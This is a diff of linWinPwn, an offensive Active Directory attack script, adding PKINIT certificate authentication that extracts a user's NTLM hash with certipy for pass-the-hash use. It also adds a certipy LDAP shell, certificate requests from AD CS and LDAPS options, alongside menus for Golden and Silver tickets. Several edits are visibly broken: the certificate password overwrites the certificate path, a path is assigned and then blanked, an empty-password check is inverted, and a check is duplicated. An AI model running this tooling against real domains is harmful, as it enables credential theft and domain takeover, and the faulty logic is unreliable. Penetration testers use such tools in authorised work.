@@ -31,7 +31,7 @@ pass_bool=false
 hash_bool=false
 kerb_bool=false
 aeskey_bool=false
-pfxcert_bool=false
+cert_bool=false
 autoconfig_bool=false
 ldaps_bool=false
 forcekerb_bool=false
@@ -93,7 +93,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.8.8 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.9.0 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -110,7 +110,8 @@ help_linWinPwn () {
     echo -e "-H                LM:NT (NTLM authentication only) (default: empty)" 
     echo -e "-K                Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)" 
     echo -e "-A                AES Key (Kerberos authentication only) (default: empty)" 
-    echo -e "-C                PFX Certificate (default: empty)" 
+    echo -e "-C                Location to PFX Certificate './cert.pfx' (default: empty)" 
+    echo -e "--cert-pass       Password of provided PFX Certificate (optional)" 
     echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
     echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
     echo -e "-o/--output       Output directory (default: current dir)"
@@ -139,7 +140,8 @@ while test $# -gt 0; do
             -H) hash="${2}"; hash_bool=true; shift;; #NTLM hash
             -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
             -A) aeskey="${2}"; aeskey_bool=true; shift;; #AES Key (128 or 256 bits)
-            -C) pfxcert="${2}"; pfxcert_bool=true; shift;; #PFX certificate (without password)
+            -C) pfxcert="${2}"; cert_bool=true; shift;; #location of PFX certificate
+            --cert-pass) pfxcert="${2}"; shift;; #Password of PFX certificate
             -t) dc_ip="${2}"; shift;; #mandatory
             --target) dc_ip="${2}"; shift;; #mandatory
             -M) modules="${2}"; shift;; #comma separated modules to run
@@ -318,7 +320,7 @@ authenticate (){
         exit 1
     
     #Check if empty password is used
-    elif [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ]; then
+    elif [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ] && [ "${pfxcert}" == "" ]; then
         argument_ne="-d ${domain} -u ${user}"
         argument_imp="${domain}/${user}:''" 
         argument_imp_gp="${domain}/${user}:''" 
@@ -345,6 +347,7 @@ authenticate (){
         hash_bool=false
         kerb_bool=false
         aeskey_bool=false
+        cert_bool=false
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}${user} with empty password ${NC}"
     
     fi
@@ -376,44 +379,64 @@ authenticate (){
         hash_bool=false
         kerb_bool=false
         aeskey_bool=false
+        cert_bool=false
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
-    #Check if NTLM hash is used, and complete with empty LM hash
-    if [ "${hash_bool}" == true ] ; then
-        if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
-            if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
-                hash="aad3b435b51404eeaad3b435b51404ee"$hash
+    #Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT
+    if [ "${hash_bool}" == true ] || [ "${cert_bool}" == true ]; then
+        if [ "${cert_bool}" == true ]; then
+            echo -e "${YELLOW}[!]${NC} WARNING only ldeep and bloodyAD currently support certificate authentication.${NC}"
+            echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
+            pkinit_auth
+            $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
+            if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
+                pem_cert="${output_dir}/Credentials/${user}.pem"
+                echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
             fi
-            argument_ne="-d ${domain} -u ${user} -H ${hash}"
-            argument_imp=" -hashes ${hash} ${domain}/${user}"
-            argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
-            argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
-            argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
-            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-            argument_adidns="-u ${domain}\\${user} -p ${hash}"
-            argument_ldd="-u ${domain}\\${user} -p ${hash}"
-            argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
-            argument_certi_py="${domain}/${user} --hashes ${hash}"
-            argument_certipy="-u ${user}@${domain} -hashes ${hash}"
+            argument_bloodyad="-d ${domain} -u ${user} -c :${pem_cert}"
+            argument_ldeep="-d ${domain} -u ${user} --pfx-file ${pfxcert}"
+            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath $pfxcert)${NC}"
+            pass_bool=false
+            kerb_bool=false
+            aeskey_bool=false
+            hash_bool=false
+            if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
+                if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
+                    hash="aad3b435b51404eeaad3b435b51404ee"$hash
+                fi
+                argument_ne="-d ${domain} -u ${user} -H ${hash}"
+                argument_imp=" -hashes ${hash} ${domain}/${user}"
+                argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
+                argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
+                argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
+                argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+                argument_adidns="-u ${domain}\\${user} -p ${hash}"
+                argument_ldd="-u ${domain}\\${user} -p ${hash}"
+                argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
+                argument_certi_py="${domain}/${user} --hashes ${hash}"
+                argument_certipy="-u ${user}@${domain} -hashes ${hash}"
+                argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
+                argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
+                argument_donpapi=" -H ${hash} ${domain}/${user}"
+                argument_hekatomb="-hashes ${hash} ${domain}/${user}"
+                argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
+                argument_windap="-d ${domain} -u ${user} --hash ${hash}"
+                argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
+                argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
+                argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
+            else
+                echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
+                exit 1
+            fi
+        else
             argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
-            argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
-            argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
-            argument_donpapi=" -H ${hash} ${domain}/${user}"
-            argument_hekatomb="-hashes ${hash} ${domain}/${user}"
-            argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
-            argument_windap="-d ${domain} -u ${user} --hash ${hash}"
-            argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
-            argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
-            argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
             argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
             pass_bool=false
             kerb_bool=false
             aeskey_bool=false
+            cert_bool=false
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
-        else
-            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
-            exit 1
         fi
     fi
     
@@ -423,6 +446,7 @@ authenticate (){
         pass_bool=false
         hash_bool=false
         aeskey_bool=false
+        cert_bool=false
         forcekerb_bool=false
         if [ -f "${krb5cc}" ] ; then
             target=${dc_FQDN}
@@ -466,6 +490,7 @@ authenticate (){
         pass_bool=false
         hash_bool=false
         kerb_bool=false
+        cert_bool=false
         forcekerb_bool=false
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
     fi
@@ -535,7 +560,7 @@ dns_enum () {
         echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
         dns_records="${output_dir}/DomainRecon/Servers/dns_records_${dc_domain}.csv"
         if [ ! -f "${dns_records}" ]; then
-            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
+            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                 echo -e "${PURPLE}[-] adidnsdump does not support kerberos authentication${NC}"
             else
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
@@ -887,6 +912,21 @@ certipy_enum () {
     echo -e ""
 }
 
+certipy_ldapshell () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        if [ "${cert_bool}" == true ] ; then
+            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
+            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" -ldap-shell 2>&1 | tee ${output_dir}/DomainRecon/certipy_ldapshell_output_${dc_domain}.txt
+        else
+            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
 fqdn_to_ldap_dn() {
   sed -e 's/[^ ]*/dc=&/g' <<<"${1//./ }" -e 's/ /,/g'
 }
@@ -899,33 +939,34 @@ bloodyad_enum () {
         if [ "${aeskey_bool}" == true ] ; then
             echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
         else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             domain_DN=$(fqdn_to_ldap_dn ${dc_domain})
             echo -e "${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for attribute minPwdLength${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for users${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get children --otype useronly" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype useronly" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt 2>/dev/null | cut -d "," -f 1 | cut -d "=" -f 2 | sort -u > ${output_dir}/DomainRecon/Users/users_list_bla_${dc_domain}.txt 2>/dev/null
             parse_users
             echo -e "${CYAN}[*] Searching for computers${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get children --otype computer" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype computer" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt 2>/dev/null | cut -d "," -f 1 | cut -d "=" -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" > ${output_dir}/DomainRecon/Servers/servers_list_bla_${dc_domain}.txt 2>/dev/null
             parse_servers
             echo -e "${CYAN}[*] Searching for containers${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get children --otype container" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype container" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get search ${domain_DN} --filter (&(samAccountType=805306368)(servicePrincipalName=*)) --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search ${domain_DN} --filter (&(samAccountType=805306368)(servicePrincipalName=*)) --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get search ${domain_DN} --filter (&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search ${domain_DN} --filter (&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for DNS entries${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get dnsDump" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get dnsDump" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
             echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt 2>/dev/null | sed -n '/[^\n]*\*/,/^$/p'
             echo -e "${CYAN}[*] Searching for writable objects${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} --host ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -1121,7 +1162,8 @@ ldeep_enum () {
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] ldeep does not support kerberos authentication${NC}"
             else
-                run_command "${ldeep} ldap ${argument_ldeep} -s ldap://${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
+                if [ "${ldaps_bool}" == true ] || [ "${cert_bool}" == true ]; then ldaps_param="-s ldaps://"; else ldaps_param="-s ldap://"; fi
+                run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
                 /bin/cp ${output_dir}/DomainRecon/ldeepDump/${dc_domain}_users_all.lst ${output_dir}/DomainRecon/Users/users_list_ldp_${dc_domain}.txt 2>/dev/null
                 /bin/cp ${output_dir}/DomainRecon/ldeepDump/${dc_domain}_computers.lst ${output_dir}/DomainRecon/Servers/servers_list_ldp_${dc_domain}.txt 2>/dev/null
                 parse_users
@@ -2227,7 +2269,22 @@ set_attackerIP(){
     done
 }
 
-ad_menu () {
+pkinit_auth() {
+    current_dir=$(pwd)
+    cd ${output_dir}/Credentials
+    if [[ ${pfxcert} == "" ]]; then
+        run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+    else
+        echo -e "${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}"
+        run_command "${certipy} cert -export -pfx $(realpath $pfxcert) -password $pfxcert -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+        run_command "${certipy} auth -pfx ${user}_unprotected.pfx -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
+    fi
+    hash=$(/bin/cat "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" 2>/dev/null | grep "Got hash for" | cut -d " " -f 6)
+    echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
+    cd ${current_dir}
+}
+
+ad_menu() {
     echo -e ""
     echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
     echo -e "--------------------------------------------------------"
@@ -2248,6 +2305,7 @@ ad_menu () {
     echo -e "14) User=Pass check using netexec (Noisy!)"
     echo -e "15) Pre2k computers authentication check (Noisy!)"
     echo -e "16) bloodyAD Enumeration"
+    echo -e "17) Certipy LDAP shell via Schannel (using Certificate Authentication)"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2327,6 +2385,10 @@ ad_menu () {
 
         16)
         bloodyad_enum
+        ad_menu;;
+
+        17)
+        certipy_ldapshell
         ad_menu;;
 
         99)
@@ -2805,7 +2867,7 @@ auth_menu () {
     echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
     echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
     echo -e "4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
-    echo -e "5) Request certificate using Certipy (requires: authenticated)"
+    echo -e "5) Request and use certificate (requires: authenticated)"
     echo -e "6) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "7) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "8) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
@@ -2875,6 +2937,7 @@ auth_menu () {
                     pass_bool=false
                     hash_bool=false
                     aeskey_bool=false
+                    cert_bool=false
                     kerb_bool=true
                     echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb5cc"
                     authenticate
@@ -2892,33 +2955,26 @@ auth_menu () {
         if [[ ! -f "${certipy}" ]] ; then
             echo -e "${RED}[-] Please verify the installation of certipy${NC}"
         else
-            if [[ ${pfxcert_bool} == false ]]; then
+            if [[ ${cert_bool} == false ]]; then
                 echo -e "Please specify location of certificate file:"
                 read -p ">> " pfxcert </dev/tty
                 while [ ! -s "${pfxcert}" ] ; do
                     echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
                     read -p ">> " pfxcert </dev/tty
                 done
-                echo -e "Please specify password of certificate file (press Enter if no password):"
-                read -p ">> " pfx_pass </dev/tty
+                if [[ ${pfxcert} == "" ]]; then
+                    echo -e "Please specify password of certificate file (press Enter if no password):"
+                    read -p ">> " pfxcert </dev/tty
+                fi
             fi
             echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
-            current_dir=$(pwd)
-            cd ${output_dir}/Credentials
-            if [[ ${pfx_pass} == "" ]]; then
-                run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
-            else
-                run_command "${certipy} cert -export -pfx $(realpath $pfxcert) -password $pfx_pass -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
-                run_command "${certipy} auth -pfx ${user}_unprotected.pfx -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
-            fi
-            hash=$(/bin/cat "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" 2>/dev/null | grep "Got hash for" | cut -d " " -f 6)
-            echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
+            pkinit_auth
             pass_bool=false
-            hash_bool=true
+            hash_bool=false
             aeskey_bool=false
             kerb_bool=false
-            authenticate
-            cd ${current_dir}
+            cert_bool=true
+           authenticate
         fi
         echo -e ""
         auth_menu
@@ -2928,20 +2984,37 @@ auth_menu () {
         if [[ ! -f "${certipy}" ]] ; then
             echo -e "${RED}[-] Please verify the installation of certipy${NC}"
         else
-            ne_adcs_enum
-            current_dir=$(pwd)
-            cd ${output_dir}/Credentials
-            i=0
-            for pki_server in $pki_servers; do
-                i=$((i + 1))
-                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
-            done
-            cd ${current_dir}
-            if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
-                echo -e "${GREEN}[+] Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ] ; then
+                ne_adcs_enum
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                i=0
+                for pki_server in $pki_servers; do
+                    i=$((i + 1))
+                    pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
+                done
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
+                    pfxcert="${output_dir}/Credentials/${user}.pfx"
+                    pfxcert=""
+                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
+                    $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
+                    if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
+                        pem_cert="${output_dir}/Credentials/${user}.pem"
+                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
+                    fi
+                    pass_bool=false
+                    hash_bool=false
+                    aeskey_bool=false
+                    cert_bool=true
+                    kerb_bool=false
+                    authenticate
+                else
+                    echo -e "${RED}[-] Failed to request certificate${NC}"
+                fi
             else
-                echo -e "${RED}[-] Failed to request certificate${NC}"
+                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"                
             fi
         fi
         auth_menu
@@ -3177,6 +3250,8 @@ config_menu () {
         if [ ! -x "${targetedKerberoast}" ] ; then echo -e "${RED}[-] targetedKerberoast is not executable${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is executable${NC}"; fi
         if [ ! -f "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
         if [ ! -x "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not executable${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is executable${NC}"; fi
+        if [ ! -f "${silenthound}" ] ; then echo -e "${RED}[-] silenthound is not installed${NC}"; else echo -e "${GREEN}[+] silenthound is installed${NC}"; fi
+        if [ ! -f "${silenthound}" ] ; then echo -e "${RED}[-] silenthound is not installed${NC}"; else echo -e "${GREEN}[+] silenthound is installed${NC}"; fi
         if [ ! -f "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
         if [ ! -f "${hekatomb}" ] ; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
         if [ ! -f "${FindUncommonShares}" ] ; then echo -e "${RED}[-] FindUncommonShares is not installed${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is installed${NC}"; fi
